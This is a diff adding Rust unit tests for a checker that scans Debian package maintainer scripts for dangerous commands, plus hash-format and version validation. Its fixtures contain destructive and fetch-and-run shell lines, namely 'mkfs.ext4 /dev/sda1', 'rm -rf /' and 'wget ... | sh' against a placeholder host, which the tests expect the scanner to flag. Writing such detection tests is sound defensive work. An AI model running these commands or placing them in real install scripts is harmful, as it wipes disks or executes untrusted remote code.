@@ -2744,6 +2744,102 @@ mod review_check_tests {
         assert!(r.findings.iter().all(|f| !f.fail));
         assert_eq!(r.scripts_scanned, 1);
     }
+
+    #[test]
+    fn hash_format_boundaries() {
+        let deb = build_deb_with_scripts("hello-app", "1.0", &[]);
+        let h = sha256_hex(&deb);
+        // One char short, one char long, and uppercase are all rejected with
+        // the format message (never as a hash mismatch).
+        for bad in [&h[..63], &format!("{h}0"), &h.to_uppercase()] {
+            let err = run_review_check(&deb, bad, "hello-app", None).unwrap_err();
+            assert!(err.contains("64 lowercase hex"), "{bad}: {err}");
+        }
+    }
+
+    #[test]
+    fn version_whitespace_and_control_rejected() {
+        let deb = build_deb_with_scripts("hello-app", "1.0", &[]);
+        let h = sha256_hex(&deb);
+        for bad in ["", "1.0 beta", "1.0\n2", "1.0\tx"] {
+            let err = run_review_check(&deb, &h, "hello-app", Some(bad)).unwrap_err();
+            assert!(err.contains("version"), "{bad:?}: {err}");
+        }
+    }
+
+    #[test]
+    fn all_scripts_scanned_and_a_fail_in_any_one_fails() {
+        let deb = build_deb_with_scripts(
+            "multi-app",
+            "1.0",
+            &[
+                ("postinst", "#!/bin/sh\nldconfig\n"),
+                (
+                    "prerm",
+                    "#!/bin/sh\n# stop the service first\nmkfs.ext4 /dev/sda1\n",
+                ),
+                ("postrm", "#!/bin/sh\ntrue\n"),
+            ],
+        );
+        let r = run_review_check(&deb, &sha256_hex(&deb), "multi-app", None).unwrap();
+        assert_eq!(r.scripts_scanned, 3);
+        let fail: Vec<_> = r.findings.iter().filter(|f| f.fail).collect();
+        assert_eq!(fail.len(), 1);
+        assert_eq!(fail[0].script, "prerm");
+        assert_eq!(fail[0].line, 3);
+    }
+
+    #[test]
+    fn url_only_warns_with_the_right_line_number() {
+        let deb = build_deb_with_scripts(
+            "doc-app",
+            "1.0",
+            &[(
+                "postinst",
+                "#!/bin/sh\n# setup\necho see https://x.example/docs for details\n",
+            )],
+        );
+        let r = run_review_check(&deb, &sha256_hex(&deb), "doc-app", None).unwrap();
+        assert_eq!(r.findings.len(), 1);
+        assert!(!r.findings[0].fail);
+        assert_eq!(r.findings[0].line, 3);
+    }
+
+    #[test]
+    fn rm_root_mid_command_fails_but_a_real_subdirectory_does_not() {
+        let evil = build_deb_with_scripts(
+            "mid-app",
+            "1.0",
+            &[("prerm", "#!/bin/sh\necho hi; rm -rf / ; echo done\n")],
+        );
+        let r = run_review_check(&evil, &sha256_hex(&evil), "mid-app", None).unwrap();
+        assert!(r.findings.iter().any(|f| f.fail));
+
+        let ok = build_deb_with_scripts(
+            "boot-app",
+            "1.0",
+            &[("prerm", "#!/bin/sh\nrm -rf /boot/old-kernel\n")],
+        );
+        let r = run_review_check(&ok, &sha256_hex(&ok), "boot-app", None).unwrap();
+        assert!(!r.findings.iter().any(|f| f.fail));
+    }
+
+    #[test]
+    fn wget_piped_to_sh_fails() {
+        let deb = build_deb_with_scripts(
+            "pipe-app",
+            "1.0",
+            &[(
+                "preinst",
+                "#!/bin/sh\nwget -qO- https://x.example/setup | sh\n",
+            )],
+        );
+        let r = run_review_check(&deb, &sha256_hex(&deb), "pipe-app", None).unwrap();
+        assert!(r
+            .findings
+            .iter()
+            .any(|f| f.fail && f.pattern == "download piped to a shell"));
+    }
 }
 
 /// The unsigned v2 allowlist authorizing exactly one approved package, plus
